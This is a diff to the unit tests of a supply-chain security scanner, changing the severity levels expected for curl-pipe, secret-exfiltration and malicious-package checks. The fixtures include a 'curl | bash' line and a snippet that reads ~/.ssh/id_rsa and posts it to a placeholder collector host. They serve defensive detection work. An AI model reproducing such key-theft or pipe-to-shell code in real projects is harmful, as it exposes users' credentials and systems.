@@ -64,11 +64,17 @@ class CurlPipe(unittest.TestCase):
         self.assertTrue(any(f["check"] == "curl-pipe" for f in fs))
         self.assertTrue(any(f["severity"] in ("medium", "high") for f in fs))
 
-    def test_known_host_is_low(self):
+    def test_known_host_is_low_in_readme(self):
+        text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
+        fs = findings_of(S.check_shell_and_docker, "README.md", text)
+        self.assertEqual(len(fs), 1)
+        self.assertEqual(fs[0]["severity"], "low")
+
+    def test_known_host_in_dockerfile_is_medium(self):
         text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
         fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
         self.assertEqual(len(fs), 1)
-        self.assertEqual(fs[0]["severity"], "low")
+        self.assertEqual(fs[0]["severity"], "medium")
 
 
 class Obfuscation(unittest.TestCase):
@@ -89,10 +95,10 @@ class Obfuscation(unittest.TestCase):
 
 
 class Secrets(unittest.TestCase):
-    def test_ssh_plus_unknown_host_is_malicious(self):
+    def test_ssh_plus_unknown_host_is_high(self):
         text = 'open(os.path.expanduser("~/.ssh/id_rsa"))\nrequests.post("https://collector.example/u", data=key)\n'
         fs = findings_of(S.check_secrets_and_network, "src/agent.py", text, set())
-        self.assertTrue(any(f["severity"] == "malicious" for f in fs), fs)
+        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
 
     def test_env_key_to_official_host_is_clean(self):
         text = 'key = os.environ["ALPACA_API_KEY"]\nrequests.get("https://api.alpaca.markets/v2/orders")\n'
@@ -209,12 +215,10 @@ class Publisher(unittest.TestCase):
 
 class OsvPolicy(unittest.TestCase):
     def test_compromised_release_not_flagged_for_range(self):
-        # axios-style short version list, declared as a caret range
-        findings = []
-        # pin_is_affected / compromised_release
+        # axios-style short version list: exact pin matches, a different pin does not
         vuln = {"id": "MAL-2026-2307", "affected": [{"package": {"name": "axios"}, "versions": ["1.14.1"]}]}
         exact, ranges, has_fixed = S.mal_affected(vuln)
-        self.assertTrue(S.compromised_release(vuln, exact, ranges, has_fixed) or len(exact) == 1)
+        self.assertTrue(len(exact) == 1)
         self.assertFalse(S.pin_is_affected(S.parse_semver("1.7.0"), exact, ranges))
         self.assertTrue(S.pin_is_affected(S.parse_semver("1.14.1"), exact, ranges))
 
@@ -225,7 +229,7 @@ class OsvPolicy(unittest.TestCase):
         self.assertEqual(repo, "")
         fs = []
         S.check_registry_match("https://github.com/nayshins/mcp-server-ccxt", "nayshins", repo, home, authors, fs, "PyPI")
-        self.assertTrue(all(f["severity"] == "low" for f in fs), fs)
+        self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "medium" for f in fs), fs)
         self.assertFalse(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs))
 
 if __name__ == "__main__":
